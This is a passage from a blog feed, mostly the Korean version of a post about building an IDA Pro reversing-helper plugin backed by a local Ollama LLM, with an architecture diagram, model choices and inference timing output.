I&#x2019;ll cover the rest of the development process and what happened at the presentation site. Until then&#x2026; wish me luck staying alive&#x2026; Bye!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 초짜 개발자의 AI 서비스 삽질기 Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/</guid>
      <pubDate>Thu, 30 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-&amp;#xBB34;&amp;#xC2A8;-&amp;#xC77C;&amp;#xC774;-&amp;#xC788;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/kr/thumbnail.jpg" alt="index_img"></p><h1 id="0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"><a href="#0-&#xBB34;&#xC2A8;-&#xC77C;&#xC774;-&#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;" class="headerlink" title="0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;"></a>0. &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xAC00;&#x2026;</h1><p>&#xD558;&#xD558; j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC65C; &#xB610; &#xC774;&#xB807;&#xAC8C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xAE00;&#xC744; &#xC4F0;&#xB0D0;&#xAD6C;&#xC694;? &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC4F4; &#xAE00;&#xC774; &#xC5B8;&#xC81C;&#xC9C0;&#x2026; &#xC544; 8&#xC6D4;&#x2026; &#xD558;&#xD558;&#x2026; &#xC0B4;&#xB824;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC880; &#xB354; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xAE00;&#xC744; &#xBC14;&#xCE58;&#xACA0;&#xB098;&#xC774;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/joker.png" alt="image.png"></p><p>&#xC624;&#xB298;&#xC740; &#xC774;&#xC804; &#xC5F0;&#xAD6C;&#xAE00;&#xB4E4;&#xACFC; &#xB2EC;&#xB9AC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xC598;&#xAE30;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 30&#xC77C;, &#xC81C; 31&#xD68C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xADF8;&#xBCF4;&#xB2E4; &#xB300;&#xB7B5; 2&#xC8FC; &#xC804;&#xC5D0; &#xAC11;&#xC790;&#xAE30; &#xC6B4;&#xC601;&#xC9C4;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5F0;&#xB77D;&#xC744; &#xBC1B;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>&#xC608;&#x2026; &#xC6D0;&#xB798; &#xBC1C;&#xD45C;&#xD558;&#xC2DC;&#xB824;&#xB358; &#xBD84;&#xC774; &#xAE09;&#xC791;&#xC2A4;&#xB7FD;&#xAC8C; &#xBC1C;&#xD45C;&#xB97C; &#xBABB;&#xD558;&#xC2E0;&#xB2E4;&#xACE0; &#xC5F0;&#xB77D;&#xC774; &#xC640;&#xC11C; &#xB300;&#xD0C0;&#xB97C; &#xAD6C;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB358; &#xAC70;&#xC600;&#xC8E0;. &#xC800;&#xB294; &#xC6D0;&#xB798; &#xC774;&#xD2C0;&#xB0A0;&#xC5D0; &#xAC00;&#xC11C; &#xBA58;&#xD2F0; &#xBC1C;&#xD45C;&#xD558;&#xB294; &#xAC70; &#xB4E3;&#xACE0; &#xC800;&#xB141;&#xC5D0; &#xC6B4;&#xC601;&#xC9C4;&#xBD84;&#xB4E4;&#xC774;&#xB791; &#xC220;&#xC774;&#xB098; &#xBA39;&#xC5B4;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xBC1C;&#xD45C;&#xB97C; &#xD558;&#xAC8C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB798;&#xC11C; &#xBC1C;&#xD45C; &#xC900;&#xBE44;&#xB97C; &#xC880; &#xD558;&#xACE0; &#xC77C;&#xC8FC;&#xC77C; &#xC815;&#xB3C4; &#xC2DC;&#xAC04; &#xC5EC;&#xC720;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;&#x2026; &#xC81C;&#xAC00; &#xC77C; &#xBC8C;&#xB9AC;&#xB294;&#xB370;&#xB294; &#xC120;&#xC218;&#xB77C; &#xBB54;&#xAC00;&#xB97C; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;"><a href="#1-&#xAE30;&#xD68D;-&#xC2DC;&#xC791;" class="headerlink" title="1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;"></a>1. &#xAE30;&#xD68D; &#xC2DC;&#xC791;</h1><p>&#xC7A0;&#xAE50; &#xADFC;&#xD669;&#xC744; &#xC598;&#xAE30;&#xD558;&#xC790;&#xBA74;, &#xCD5C;&#xADFC; L0ch&#xC640; Hacky-AI&#xB77C;&#xB294; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xCC3D;&#xC5C5;&#xD574;&#xC11C; &#xBCF4;&#xC548; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xAD00;&#xC2EC;&#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xC800;&#xD76C; <a href="https://hacky-ai.com/">&#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xBC29;&#xBB38;&#xD574;&#xC8FC;&#xC138;&#xC694;!) &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC740; &#xACE0;&#xAC1D;&#xC758; &#xBB38;&#xC81C;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xBC95;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xC2E0;&#xACBD; &#xC4F8; &#xAC83;&#xC774; &#xB9CE;&#xC9C0;&#xB9CC;&#x2026; &#xC544;&#xBB34;&#xD2BC; &#xADF8;&#xB798;&#xC11C; &#x201C;&#xBC1C;&#xD45C;&#xB97C; &#xB4E3;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAE4C;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC194;&#xB8E8;&#xC158;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC788;&#xAE30;&#xB3C4; &#xD574;&#xC11C; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774; &#xB54C; &#xCD5C;&#xB300;&#xD55C; &#xC9C0;&#xD0A4;&#xACE0;&#xC790; &#xD588;&#xB358; &#xAC83;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB0B4;&#xAC00; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC9C0; &#xB9D0;&#xACE0; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC774; &#xB2E4; &#xC791;&#xC131;&#xD558;&#xAC8C; &#xD558;&#xC790;.</li><li>&#xC77C;&#xC8FC;&#xC77C;&#xBC16;&#xC5D0; &#xC5C6;&#xC73C;&#xB2C8; &#xB3CC;&#xC544;&#xAC00;&#xAC8C;&#xB9CC; &#xB9CC;&#xB4E4;&#xC790;.</li><li>&#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC790;.</li></ol><p>&#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xB294; 1&#xC77C;&#xCC28; &#xC800;&#xB141;&#xC5D0; CTF&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;, &#xADF8;&#xB798;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC815;&#xD55C; &#xAC83;&#xC740; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xC774;&#xC81C; &#xB9C9; &#xD574;&#xD0B9;&#xC744; &#xC2DC;&#xC791;&#xD55C; &#xBD84;&#xB4E4;&#xC77C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC5D0;&#xB294; &#xC544;&#xC9C1; &#xB9CE;&#xC774; &#xC775;&#xC219;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xC2E4; &#xAC83;&#xC774;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1; &#xBCF4;&#xC870; &#xB3C4;&#xAD6C;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xBA74; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD63C;&#xC790; 3&#xC77C; &#xC815;&#xB3C4; &#xD22C;&#xC790;&#xD558;&#xBA74; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC5C8;&#xC8E0;.(&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC83;&#xC740; &#xC624;&#xB9CC;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;) &#xC880; &#xB354; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC77D;&#xAE30; &#xC26C;&#xC6B4; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC8FC;&#xACE0; &#xD568;&#xC218; &#xB0B4;&#xC6A9;&#xC744; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(IDA&#xB97C; &#xC548; &#xD0A8;&#xC9C0; 1&#xB144;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xB2C8; &#xC774;&#xBBF8; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB85C; &#xC788;&#xB294; &#xAC78; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#x2026; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xB294;&#xAC8C; &#xCDE8;&#xC9C0;&#xB2C8;&#xAE4C;&#xC694;)</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC11C;&#xBE44;&#xC2A4; &#xD750;&#xB984;&#xB3C4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-&#xC11C;&#xBC84;"><a href="#2-Ollama-&#xC11C;&#xBC84;" class="headerlink" title="2. Ollama &#xC11C;&#xBC84;"></a>2. Ollama &#xC11C;&#xBC84;</h1><p>&#xBA3C;&#xC800; &#xC65C; &#xC0C1;&#xC6A9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC4F0;&#xC9C0; &#xC54A;&#xB0D0;?&#xB294; &#xC9C8;&#xBB38;&#xC774; &#xB4DC;&#xC2E4;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. Gemini, ChatGPT &#xB4F1; &#xC88B;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740;&#xB370; &#xB9D0;&#xC774;&#xC8E0;. &#xC77C;&#xB2E8; &#xAC1C;&#xC778;&#xC801;&#xC778; &#xC0DD;&#xAC01;&#xC740; &#x201C;&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xB294; &#xC791;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#x201D; &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC3D;&#xC5C5; &#xC804; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB3C4; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xACE0;, &#xD604;&#xC7AC; &#xC5F0;&#xAD6C;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC131;&#xB2A5;&#xC758; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;&#xC694; &#x3160;&#x3160;</p><p>&#xD604;&#xC7AC; &#xC81C;&#xAC00; &#xC9D1;&#xC5D0;&#xC11C; LLM &#xCD94;&#xB860;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB294; &#xB9E5;&#xBBF8;&#xB2C8; &#xC785;&#xB2C8;&#xB2E4;. M4 Pro &#xCE69;&#xC744; &#xD0D1;&#xC7AC;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xB7A8;&#xC740; 64&#xAE30;&#xAC00; &#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0; Ollama &#xC11C;&#xBC84;&#xB97C; &#xC62C;&#xB9AC;&#xACE0; &#xBAA8;&#xB378;&#xC744; &#xC11C;&#xBE59;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://ollama.com/search">Ollama &#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xAC00;&#xBCF4;&#xC2DC;&#xBA74; &#xB7A8; 64&#xAE30;&#xAC00; &#xB0B4;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; gpt-oss, deepseek &#xB4F1; &#xBAA8;&#xB378; &#xC911;&#xC5D0;&#xC11C; &#xC800;&#xB294; 32B &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xC758; &#xBAA8;&#xB378;&#xB4E4; &#xC911; q8&#xB85C; &#xC591;&#xC790;&#xD654;&#xB41C; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xC88B;&#xC544;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xB4E4;&#xC5B4;&#xBCF4;&#xC790;&#xBA74;:</p><ul><li>70B q4 &#xBAA8;&#xB378;&#xB4E4;(&#xB2E4;&#xC6B4;&#xBC1B;&#xC73C;&#xBA74; &#xC57D; 40G &#xC815;&#xB3C4;)&#xC744; &#xB7A8; 64&#xAE30;&#xAC00;&#xC5D0;&#xC11C; &#xB3CC;&#xB9B4; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xB2F9;&#xC2DC; 70B &#xBAA8;&#xB378;&#xB4E4;&#xC740; &#xB098;&#xC628;&#xC9C0; &#xC870;&#xAE08; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB09C; &#xBAA8;&#xB378;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAE34; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xC704;&#xD55C; &#xACF5;&#xAC04;&#xB3C4; &#xB0A8;&#xACA8;&#xB46C;&#xC57C;&#xD55C;&#xB2E4; &#xC0DD;&#xAC01;&#xD574;&#xC11C; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC4F0;&#xBA74; &#xC88B;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>8&#xC6D4; &#xC911;&#xC21C;&#xCBE4;&#xC5D0; &#xB098;&#xC628; &#xD56B;&#xD55C; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xACE0; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. gpt-oss&#xC758; &#xACBD;&#xC6B0; 20B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xACE0;, qwen3&#xC5D0;&#xB294; 32B&#xACFC; 30B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xC8E0;. &#xC774; &#xBAA8;&#xB378;&#xB4E4; &#xACBD;&#xC6B0;, &#xCCB4;&#xAC10;&#xC0C1; &#xCD5C;&#xC2E0; ChatGPT 4o &#xC815;&#xB3C4; &#xD639;&#xC740; &#xADF8;&#xBCF4;&#xB2E4; &#xC0B4;&#xC9DD; &#xB354; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xB0B4;&#xB294; &#xB4EF; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC778; phi4 14B, gemma 27B &#xB4F1;&#xC744; &#xC81C;&#xAC00; &#xBBF8;&#xB9AC; &#xC138;&#xD305;&#xD574;&#xB454; &#xBA87; &#xAC1C;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xBA74;&#xC11C; &#xC131;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC5EC;&#xB7EC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xAC70;&#xCE5C; &#xACB0;&#xACFC; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p>&#xB2F9;&#xC5F0;&#xD55C;&#xAC70;&#xC9C0;&#xB9CC; MoE &#xBAA8;&#xB378;&#xC774; &#xC77C;&#xBC18; &#xBAA8;&#xB378;&#xBCF4;&#xB2E4; &#xCD94;&#xB860;&#xC18D;&#xB3C4;&#xAC00; &#xD6E8;&#xC52C; &#xBE60;&#xB985;&#xB2C8;&#xB2E4;. Qwen3 32B q8 &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, 7 tps &#xC815;&#xB3C4;&#xC758; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC654;&#xACE0; Qwen 30B MoE &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0; &#xB192;&#xC73C;&#xBA74; 45 tps&#xAE4C;&#xC9C0; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC18C;&#xADDC;&#xBAA8; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span 